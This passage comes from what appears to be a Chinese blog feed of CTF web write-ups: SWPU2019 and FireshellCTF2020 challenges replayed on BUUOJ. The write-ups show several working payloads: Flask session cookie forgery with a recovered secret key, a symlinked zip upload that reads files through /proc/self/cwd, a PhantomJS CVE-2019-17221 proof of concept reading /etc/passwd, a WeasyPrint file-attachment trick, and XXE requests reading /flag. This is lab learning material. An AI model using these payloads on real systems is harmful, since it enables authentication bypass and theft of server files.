class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure><p>这种py的脚本一般用linux运行比较流畅，linux不愧是开发者的次爱。</p><p>解出来的session的明文内容如下所示:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -c &#x27;.eJyrVspMUbKqVlJIUrJS8g1xLFeq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PL0IojHIPy42MCCtOcbS1BWkoLU4tykvMTcWhoBYAbr4gMA.X-BAHg.sL-SHZU_eJwtQWbI9pqvk-lhodE&#x27; -s &#x27;keyqqqwwweee!@#$%^&amp;*&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>&#x27;id&#x27;<span class="punctuation">:</span> &#x27;<span class="number">100</span>&#x27;<span class="punctuation">,</span> &#x27;is_login&#x27;<span class="punctuation">:</span> True<span class="punctuation">,</span> &#x27;password&#x27;<span class="punctuation">:</span> &#x27;default&#x27;<span class="punctuation">,</span> &#x27;username&#x27;<span class="punctuation">:</span> &#x27;default&#x27;<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这里我们的username与password并不是最重要的，注意到这里有个id字段，猜测这里可能类似linux里面的uid，root的id也许是1，伪造session:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>&#x27;id&#x27;<span class="punctuation">:</span> &#x27;<span class="number">1</span>&#x27;<span class="punctuation">,</span> &#x27;is_login&#x27;<span class="punctuation">:</span> True<span class="punctuation">,</span> &#x27;password&#x27;<span class="punctuation">:</span> &#x27;default&#x27;<span class="punctuation">,</span> &#x27;username&#x27;<span class="punctuation">:</span> &#x27;default&#x27;<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>伪造过程:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s &#x27;keyqqqwwweee!@#$%^&amp;*&#x27; -t &quot;&#123;&#x27;id&#x27;: &#x27;1&#x27;, &#x27;is_login&#x27;: True, &#x27;password&#x27;: &#x27;default&#x27;, &#x27;username&#x27;: &#x27;default&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure><p>伪造结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJyrVspMUbJSMlTSUcosjs_JT8_MU7IqKSpN1VEqSCwuLs8vAkmnpKYlluaUABWVFqcW5SXmpiIJ1gIA-tEW8A.X-CEiQ.6wmZvxP1Jy1Vns2r_tXxu0Z_tFY</span><br></pre></td></tr></table></figure><p>伪造admin之后就能上传文件了，查看源代码之后有py文件的源代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;id&#x27;</span>] != <span class="string">b&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(temp)</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        m = hashlib.md5()</span><br><span class="line">        name = session[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        name = name+<span class="string">&#x27;qweqweqwe&#x27;</span></span><br><span class="line">        name = name.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        m.update(name)</span><br><span class="line">        md5_one= m.hexdigest()</span><br><span class="line">        n = hashlib.md5()</span><br><span class="line">        ip = request.remote_addr</span><br><span class="line">        ip = ip.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        n.update(ip)</span><br><span class="line">        md5_ip = n.hexdigest()</span><br><span class="line">        f=request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        basepath=os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        path = basepath+<span class="string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="string">&#x27;/&#x27;</span>+md5_one+<span class="string">&#x27;/&#x27;</span>+session[<span class="string">&#x27;username&#x27;</span>]+<span class="string">&quot;/&quot;</span></span><br><span class="line">        path_base = basepath+<span class="string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="string">&#x27;/&#x27;</span></span><br><span class="line">        filename = f.filename</span><br><span class="line">        pathname = path+filename</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;zip&quot;</span> != filename.split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;zip only allowed&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path_base):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path_base)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(pathname):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f.save(pathname)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = <span class="string">&quot;unzip -n -d &quot;</span>+path+<span class="string">&quot; &quot;</span>+ pathname</span><br><span class="line">            <span class="keyword">if</span> cmd.find(<span class="string">&#x27;|&#x27;</span>) != -<span class="number">1</span> <span class="keyword">or</span> cmd.find(<span class="string">&#x27;;&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">waf()</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">            os.system(cmd)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        unzip_file = zipfile.ZipFile(pathname,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        unzip_filename = unzip_file.namelist()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&#x27;is_login&#x27;</span>] != <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;not login&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> unzip_filename.find(<span class="string">&#x27;/&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">                shutil.rmtree(path_base)</span><br><span class="line">                os.mkdir(path_base)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">            image = <span class="built_in">open</span>(path+unzip_filename, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">            resp = make_response(image)</span><br><span class="line">            resp.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;image/png&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            shutil.rmtree(path_base)</span><br><span class="line">            os.mkdir(path_base)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/showflag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showflag</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="literal">True</span> == <span class="literal">False</span>:</span><br><span class="line">        image = <span class="built_in">open</span>(os.path.join(<span class="string">&#x27;./flag/flag.jpg&#x27;</span>), <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">        resp = make_response(image)</span><br><span class="line">        resp.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;image/png&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;can&#x27;t give you&quot;</span></span><br></pre></td></tr></table></figure><p>最后这个true&#x3D;&#x3D;false太秀了，原来是告诉我flag文件是藏在.&#x2F;flag目录下的，恕我眼拙。</p><p>下面的为新学到的内容</p><blockquote><p>ln -s是Linux的一种软连接,类似与windows的快捷方式<br>ln -s &#x2F;etc&#x2F;passwd forever404 这会出现一个forever404文本,里面包含密码<br>&#x2F;proc&#x2F;self 记录了系统运行的信息状态等,cwd 指向当前进程运行目录的一个符号链接,即flask运行进程目录</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ln -s /proc/self/cwd/flag/flag.jpg test</span><br><span class="line">zip -ry test.zip test</span><br><span class="line"></span><br><span class="line">其中-y参数代表的含义为:直接保存符号连接，而非该连接所指向的文件，本参数仅在UNIX之类的系统下有效</span><br></pre></td></tr></table></figure><p>就是先用ln命令保存一个符号链接在当前目录下，然后使用zip命令再将该test文件压缩为test.zip文件名的文件，直接将该文件上传之后抓包即得flag。会将该进程下的flag.jpg文件的内容返回。<br><code>flag&#123;d4b1eed3-fcd5-4781-8c49-5b4a85c1bf27&#125;</code><br><img src="/2020/12/21/SWPU2019-web//1.png"></p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FireshellCTF2020复现</title>
      <link href="/2020/12/15/FireshellCTF2020%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/12/15/FireshellCTF2020%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>注:第一个在其他的文章里面是个assa的什么题目，直接包含<code>#include &quot;/flag&quot;</code>报错好像就行了。</p></blockquote><h2 id="1-URL-TO-PDF"><a href="#1-URL-TO-PDF" class="headerlink" title="1.URL TO PDF"></a>1.URL TO PDF</h2><p>看wp，说是WeasyPrint的一个专门的漏洞，会把网站里面有些东西先解析一边，然后再给打印出来pdf，所以先写一个界面放在我的服务器端。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;attachment&quot;</span> href=<span class="string">&quot;file:///flag&quot;</span>&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>然后请求一下，就能获得一个pdf文件了，然后丢进kali里面，使用下面的命令下载工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install poppler-utils</span><br></pre></td></tr></table></figure><p>就有工具pdfdetach啦，这个工具可以分离出pdf文件中嵌入的数据。。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdfdetach e14071e5d454cd17815fe8cfc7e87303.pdf -saveall</span><br></pre></td></tr></table></figure><p>直接分离出flag，这也太misc了。<br><code>flag&#123;2e8b851d-dcaa-4f4d-bbce-a32f1c1fe5ca&#125;</code></p><h2 id="2-ScreenShooter"><a href="#2-ScreenShooter" class="headerlink" title="2.ScreenShooter"></a>2.ScreenShooter</h2><p>他们当时做的时候可以显示到信息泄露，但是我复现的时候没发现。可能是我环境的问题，不过也算是学习了，ua也能泄露信息。<br><code>Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1</code></p><p>这是一个2019的CVE，CVE-2019-17221，好家伙，网上流传的poc很少，知道这是哪个cve之后先上<a href="https://github.com/h4ckologic/CVE-2019-17221">gayhub</a>，pdf文件里面有poc，如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">File: test.html</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">x=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>;</span></span><br><span class="line"><span class="language-javascript">x.<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript">x.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///etc/passwd&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">x.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>对此我们可以稍加改动，将<code>/etc/passwd</code>改为<code>/flag</code>即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">x=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>;</span></span><br><span class="line"><span class="language-javascript">x.<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript">x.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///flag&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">x.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>搞到我的服务器上面，访问我服务器的页面获得png，上面就有flag（看不到的话下载到本地可以看到）。</p><p><code>flag&#123;5d291771-7886-42df-9cb6-9fe99860da38&#125;</code></p><h2 id="3-Cars"><a href="#3-Cars" class="headerlink" title="3.Cars"></a>3.Cars</h2><p>先把附件解压缩一下，是个安卓，做过一点垃圾安卓软件，了解一点目录结构。</p><p>就先去找java目录，目录深层有个CARS的文件夹，用vscode打开之后分析kotlin源码，其实跟java没啥差别，找到<code>Rest.kt</code>文件，里面的代码为:</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.arconsultoria.cars.rest</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.arconsultoria.cars.domain.Car</span><br><span class="line"><span class="keyword">import</span> com.arconsultoria.cars.domain.Comment</span><br><span class="line"><span class="keyword">import</span> com.arconsultoria.cars.domain.CommentResponse</span><br><span class="line"><span class="keyword">import</span> retrofit2.Call</span><br><span class="line"><span class="keyword">import</span> retrofit2.http.Body</span><br><span class="line"><span class="keyword">import</span> retrofit2.http.GET</span><br><span class="line"><span class="keyword">import</span> retrofit2.http.POST</span><br><span class="line"><span class="keyword">import</span> retrofit2.http.Path</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Rest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GET(<span class="string">&quot;/cars&quot;</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">getCars</span><span class="params">()</span></span>: Call&lt;List&lt;Car&gt;&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GET(<span class="string">&quot;/car/&#123;id&#125;&quot;</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">getCar</span><span class="params">(<span class="meta">@Path(<span class="string">&quot;id&quot;</span>)</span> id: <span class="type">Int</span>)</span></span>: Call&lt;Car&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@POST(<span class="string">&quot;/comment&quot;</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">postComment</span><span class="params">(<span class="meta">@Body</span> comment: <span class="type">Comment</span>)</span></span>: Call&lt;CommentResponse&gt;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最下面的是一个POST的数据，应该是在request body里面上传的数据需要，然后上传的数据的键值对在上面已经import过了，看上面的import的文件<br><code>import com.arconsultoria.cars.domain.Comment</code><br>将<code>.</code>换成<code>/</code>找到文件<code>com/arconsultoria/cars/domain/Comment.kt</code>其中的内容如下:</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.arconsultoria.cars.domain</span><br><span class="line"></span><br><span class="line"><span class="keyword">data</span> <span class="class"><span class="keyword">class</span> <span class="title">Comment</span></span>(</span><br><span class="line">    <span class="keyword">var</span> name: String,</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> message: String</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>可见有两个字段，可以上传json数据先试试水。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /comment HTTP/1.1</span><br><span class="line">Host: fd673db5-233d-4567-ba6b-65c0a44cd875.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 44</span><br><span class="line">Content-Type:application/json</span><br><span class="line">Content-Length: 44</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;: &quot;Test Comment&quot;,&quot;message&quot;: &quot;Hello!&quot;&#125;</span><br></pre></td></tr></table></figure><p>可以返回，然后改成xml实现xxe。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /comment HTTP/1.1</span><br><span class="line">Host: fd673db5-233d-4567-ba6b-65c0a44cd875.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 53</span><br><span class="line">Content-Type:application/xml</span><br><span class="line">Content-Length: 53</span><br><span class="line"></span><br><span class="line">&lt;test&gt;</span><br><span class="line">&lt;name&gt;1&lt;/name&gt;</span><br><span class="line">&lt;message&gt;2&lt;/message&gt;</span><br><span class="line">&lt;/test&gt;</span><br></pre></td></tr></table></figure><p>xml测试也可以，直接上xxe的一般payload。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /comment HTTP/1.1</span><br><span class="line">Host: fd673db5-233d-4567-ba6b-65c0a44cd875.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 218</span><br><span class="line">Content-Type:application/xml</span><br><span class="line">Content-Length: 218</span><br><span class="line"></span><br><span class="line">&lt;?xml  version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">   &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">      &lt;!ENTITY xxe SYSTEM  &quot;file:///flag&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;Comment&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">    &lt;message&gt;flag please!&lt;/message&gt;</span><br><span class="line">&lt;/Comment&gt;</span><br></pre></td></tr></table></figure><h5 id="attention"><a href="#attention" class="headerlink" title="attention"></a>attention</h5><p>一般的xxe的payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml  version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">      <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span>  <span class="string">&quot;file:///flag&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Comment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">message</span>&gt;</span>flag please!<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Comment</span>&gt;</span></span><br></pre></td></tr></table></figure><p>得flag</p><p><code>flag&#123;0e51772b-9ed8-446a-a2de-0776c0692533&#125;</code></p><p><strong>目前为止，buu上的所有fireshell的web题目都复现完了</strong></p><blockquote><p>小丑竟是我自己</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RootersCTF2019-ImgXweb</title>
      <link href="/2020/12/07/RootersCTF2019-ImgXweb/"/>
      <url>/2020/12/07/RootersCTF2019-ImgXweb/</url>
      
